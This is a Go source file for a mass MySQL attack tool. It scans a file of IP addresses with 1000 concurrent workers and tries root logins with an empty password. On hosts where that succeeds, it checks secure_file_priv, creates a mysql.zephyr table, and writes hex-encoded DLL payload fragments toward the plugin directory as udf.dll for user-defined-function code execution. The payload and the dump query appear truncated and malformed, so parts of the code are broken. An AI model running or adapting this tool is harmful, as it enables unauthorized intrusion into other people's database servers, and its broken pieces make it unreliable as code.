package mysql

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"os"
	"sync"

	_ "github.com/go-sql-driver/mysql"
)

func getConnectionDSN(hostIP string) string {
	defaultUsername := "root"
	defaultPassword := ""

	return defaultUsername + ":" + defaultPassword + "@tcp(" + hostIP + ":3306)/?timeout=120s"
}

func recovery(hostIP string) {
	if r := recover(); r != nil {
		fmt.Println("recovered from ", r)
	}
}

func checkAuthenticated(db *sql.DB) bool {
	err := db.Ping()

	if err != nil {
		return false
	}

	return true
}

func connect(ip string) *sql.DB {
	defer recovery(ip)

	dsn := getConnectionDSN(ip)
	db, err := sql.Open("mysql", dsn)

	if err != nil {
		log.Println("Connection failed: ", err)
		return nil
	}
	return db
}

func ScanHosts(fileName string, wg *sync.WaitGroup) {

	file, err := os.Open(fileName)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	queue := make(chan string)
	scanner := bufio.NewScanner(file)

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	doScan := func(ip string) {
		ScanHost(ip)
	}

	for worker := 0; worker < 1000; worker++ {
		wg.Add(1)

		go func() {
			defer wg.Done()

			for ip := range queue {
				doScan(ip)
			}
		}()
	}

	for scanner.Scan() {
		queue <- scanner.Text()
	}

	close(queue)
}

func ScanHost(ip string) {
	db := connect(ip)
	isAuthenticated := checkAuthenticated(db)

	if isAuthenticated {
		fmt.Println("Successfully authenticated on:", ip)

		loadFileAttack(db)
	}

	db.Close()
}

func executeCommand(command string, connection *sql.DB) {
	connection.Exec(command)
}

func executeQuery(query string, connection *sql.DB) string {
	execQuery, err := connection.Query(query)

	if err != nil {
		log.Fatalf("Query Error %s", err)
	}

	defer execQuery.Close()

	var resultStr string
	var result string

	for execQuery.Next() {
		execQuery.Scan(&resultStr)
		result += resultStr
	}

	return result
}

func loadUDF2Win(connection *sql.DB) {
	fmt.Println("ATTACK ON WIN")
	architecture := getArchitecture(connection)
	if architecture == "x86_64" {
		fmt.Println("Generating 64bit payload!")
		executeCommand("insert into mysql.zephyr(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);", connection)
		executeCommand("update mysql.zephyr set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);", connection)
		executeCommand("select data from mysql.zephyr into dump file"+getPluginDir(connection)+"udf.dll", connection)
	} else {
		fmt.Println("Generating 32bit payload!")
	}
}

func loadUDF2Linux(connection *sql.DB) {
	fmt.Println("ATTACK ON LINUX")
	architecture := getArchitecture(connection)
	if architecture == "x86_64" {
		fmt.Println("Generating 64bit payload!")
		executeCommand("insert into mysql.zephyr(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);", connection)
		executeCommand("update mysql.zephyr set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);", connection)
	} else {
		fmt.Println("Generating 32bit payload!")
	}
}

func loadFileAttack(connection *sql.DB) {
	vulnerable := isSecureFilePrivConfigVulnerable(connection)
	if vulnerable {
		fmt.Println("TARGET VULNERABLE")
		executeCommand("create table if not exists mysql.zephyr(data longblob);", connection)
		targetOS := getOS(connection)
		if targetOS == "Linux" {
			loadUDF2Linux(connection)
		}
	}
}

func isSecureFilePrivConfigVulnerable(connection *sql.DB) bool {
	secureFilePriv := executeQuery("select @@secure_file_priv;", connection)
	if secureFilePriv == "" {
		return true
	}
	return false
}

func getPluginDir(connection *sql.DB) string {
	return executeQuery("select @@plugin_dir;", connection)
}

func getArchitecture(connection *sql.DB) string {
	return executeQuery("select @@version_compile_machine;", connection)
}

func getOS(connection *sql.DB) string {
	return executeQuery("select @@version_compile_os;", connection)
}

func getVersion(connection *sql.DB) string {
	return executeQuery("select @@innodb_version;", connection)
}

func getUser(connection *sql.DB) string {
	return executeQuery("SELECT USER();", connection)
}

func getUserPrivileges(connection *sql.DB) string {
	var user string = getUser(connection)

	return executeQuery("SHOW GRANTS FOR "+user, connection)
}
